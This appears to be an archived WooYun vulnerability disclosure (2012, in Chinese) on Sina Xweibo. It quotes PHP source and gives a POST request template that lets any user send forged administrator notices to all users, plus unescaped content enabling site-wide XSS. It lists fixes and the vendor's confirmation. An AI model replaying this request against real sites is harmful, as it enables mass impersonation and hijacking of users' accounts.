@@ -1,0 +1,245 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪Xweibo程序伪造管理员给任意/全体用户发Notice  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪Xweibo程序伪造管理员给任意/全体用户发Notice  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/牛奶坦克">牛奶坦克</a> 
+</li><li>提交时间：		2012-03-13 15:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-03-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-03-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-03-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-04-02：	细节向普通白帽子公开<br/>
+									2012-04-12：	细节向实习白帽子公开<br/>
+									2012-04-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">  起因是发现了xweibo某个注入漏洞，但是后来发现这个功能是需要管理权限的，总是这样大意。。。不过还是找到点好玩的东西。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>首先xweibo搞了个路由函数，对用户提交的变量做同一的分配控制<br />
+	function V($vRoute,$def_v=NULL,$setVar=false){<br />
+		static $v;<br />
+		if (empty($v)){$v = array();}<br />
+		$vRoute = trim($vRoute);<br />
+<br />
+		//强制初始化值<br />
+		if ($setVar) {$v[$vRoute] = $def_v;return true;}<br />
+<br />
+		if (!isset($v[$vRoute])){<br />
+			$vKey = array(&#039;C&#039;=&gt;$_COOKIE,&#039;G&#039;=&gt;$_GET,		&#039;P&#039;=&gt;$_POST,&#039;R&#039;=&gt;$_REQUEST,<br />
+						  &#039;F&#039;=&gt;$_FILES,	&#039;S&#039;=&gt;$_SERVER,	&#039;E&#039;=&gt;$_ENV,<br />
+						  &#039;-&#039;=&gt;$GLOBALS[V_CFG_GLOBAL_NAME]<br />
+			);<br />
+			if (empty($vKey[&#039;R&#039;])) {<br />
+				$vKey[&#039;R&#039;] = array_merge($_COOKIE, $_GET, $_POST);<br />
+			}<br />
+			if ( !preg_match(&quot;#^([cgprfse-])(?::(.+))?\$#sim&quot;,$vRoute,$m) || !isset($vKey[strtoupper($m[1])]) ){<br />
+				trigger_error(&quot;Can&#039;t parse var from vRoute: $vRoute &quot;, E_USER_ERROR);<br />
+				return NULL;<br />
+			}<br />
+省略<br />
+<br />
+用户操作功能都封装在了action模块中，action.mod.php，找到sendNotice这个action<br />
+		function sendNotice() {<br />
+			$nowTime = APP_LOCAL_TIMESTAMP;<br />
+			$sina_uid = V(&#039;p:uid&#039;, 0);<br />
+			$title = trim(V(&#039;p:title&#039;, &#039;&#039;));<br />
+			$content = trim(V(&#039;p:content&#039;, &#039;&#039;));<br />
+			$available_time = (int)V(&#039;p:available_time&#039;, $nowTime);<br />
+			省略			<br />
+			$rst = DR(&#039;notice.sendNotice&#039;, &#039;&#039;, $title, $content, $sina_uid, null, 0, $available_time);<br />
+			if (!empty($rst[&#039;errno&#039;])) {<br />
+				APP::ajaxRst(false, $rst[&#039;errno&#039;], $rst[&#039;err&#039;]);<br />
+				exit;<br />
+			} else {<br />
+				APP::ajaxRst(true, 0);<br />
+				exit;<br />
+			}<br />
+		}<br />
+<br />
+没啥限制额，在看看notice中的功能定义<br />
+<br />
+		$send_all = $sina_uid === 0 ? true : false; //是否发送给全站用户<br />
+		<br />
+		if (is_null($sina_uid)) {<br />
+			$sina_uid = array();<br />
+		} else if (!is_array($sina_uid)) {<br />
+			$sina_uid = (array)$sina_uid;<br />
+		}<br />
+... ...<br />
+		$data = array();<br />
+		$data[&#039;sender_id&#039;] = $sender_id;<br />
+		$data[&#039;title&#039;] = $title;<br />
+		$data[&#039;content&#039;] = $content;<br />
+		$data[&#039;add_time&#039;] = APP_LOCAL_TIMESTAMP;<br />
+		$data[&#039;available_time&#039;] = empty($available_time) ? APP_LOCAL_TIMESTAMP : $available_time;<br />
+		<br />
+		$notice_id = $this-&gt;db-&gt;save($data, 0, T_NOTICE);<br />
+		if ($notice_id === false) {<br />
+			return RST(false, 1210004, &#039;发送失败，请重试&#039;);<br />
+		}<br />
+<br />
+直接构造利用这个action<br />
+POST /?m=api/weibo/action.sendNotice&amp;_=1331620238391 HTTP/1.1<br />
+.. ..<br />
+<br />
+uid=[改为0为群发，其他用户uid为单独发送]&amp;title=[标题]&amp;content=[内容]&amp;available_time=123123123</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+另外，最后发现显示内容还没有做html格式化，所以还能以管理员名义给全站用户来个xss，这个xss的意义在于可以绕过官方限制做一些加关注，发微博等所有xweibo接口支持的用户操作功能（经过确认xweibo没啥限制），可以控制这个xweibo站点上所有用户/微博用户的行为。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1315393013c8b9e78e298ed2ef5c31843d404d4b.jpg" target="_blank"><img src="../images/1315393013c8b9e78e298ed2ef5c31843d404d4b.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/131539375bd104a68ae72aeece03bca4e65bbe6c.jpg" target="_blank"><img src="../images/131539375bd104a68ae72aeece03bca4e65bbe6c.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1，notice接口需要身份限制；<br />
+<br />
+2，xss问题需要转义；<br />
+<br />
+3，其他微博操作接口需要做csrf，referer等检测。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/牛奶坦克" title="牛奶坦克">牛奶坦克</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-05235" title="新浪Xweibo程序伪造管理员给任意/全体用户发Notice">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-03-13 18:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，正在处理</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="5235";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
